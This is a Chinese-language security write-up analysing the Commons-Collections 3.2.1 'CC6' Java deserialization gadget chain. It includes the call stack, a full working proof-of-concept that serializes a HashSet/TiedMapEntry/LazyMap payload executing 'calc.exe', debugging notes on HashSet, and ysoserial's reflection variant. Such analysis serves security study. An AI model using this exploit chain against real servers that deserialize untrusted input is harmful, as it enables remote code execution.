## CommonsCollections_6

本机环境：

JDK版本：jdk1.7u_51

CC版本：Commons-Collections 3.2.1

同样是对` HashMap#put()`的调用，在ysoserial中，由 `java.util.HashSet#readObject `。

于是调用栈：

```
Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()
```

## POC&复现

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CommonCollections6_set {
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,
                        Class[].class }, new Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[] { "calc.exe" }),
                new ConstantTransformer(1),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
        HashSet expSet = new HashSet(1);
        expSet.add(tme);
        outerMap.remove("keykey");
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expSet);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

![image-20220719153650471](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719153650471.png)





## 调式分析

### HashSet

HashSet 是一个无序的，不允许有重复元素的集合。HashSet 本质上就是由 HashMap 实现的。HashSet 中的元素都存放在 HashMap 的 key 上面，而 value 中的值都是统一的一个`private static final Object PRESENT = new Object();`。HashSet 跟 HashMap 一样，都是一个存放链表的数组。

在 HashSet 的 readObject 方法中，会调用其内部 HashMap 的 put 方法，将值放在 key 上。

![image-20220719154446945](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719154446945.png)

这里调用了map.put，其中map可以控制为HashMap，而传入的第一个参数e是用readObject取出来的，那么对应的我们就看看writeObject怎么写的：

![image-20220719155037971](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719155037971.png)

这里s可控，则e可控，我们需要控制传入map的keySet返回结果来控制变量。

我们的POC中只是简单的在 HashMap 之外嵌套了一层 HashSet，而yso的作者是这样调用的：

```java
HashSet hashset = new HashSet(1);
hashset.add("foo");
//利用反射获取我们的 HashSet 的 map 属性，因为我们要先获取到 map 才能对 map 的 key 进行修改
Field field = Class.forName("java.util.HashSet").getDeclaredField("map");
field.setAccessible(true);
HashMap hashset_map = (HashMap) field.get(hashset);
//修改我们 HashMap 中的 key 值为 hashset
Field table = Class.forName("java.util.HashMap").getDeclaredField("table");
table.setAccessible(true);
Object[] array = (Object[])table.get(hashset_map);

Object node = array[0];
if(node == null){
node = array[1];
}

Field key = node.getClass().getDeclaredField("key");
key.setAccessible(true);
key.set(node,tiedmap);
```

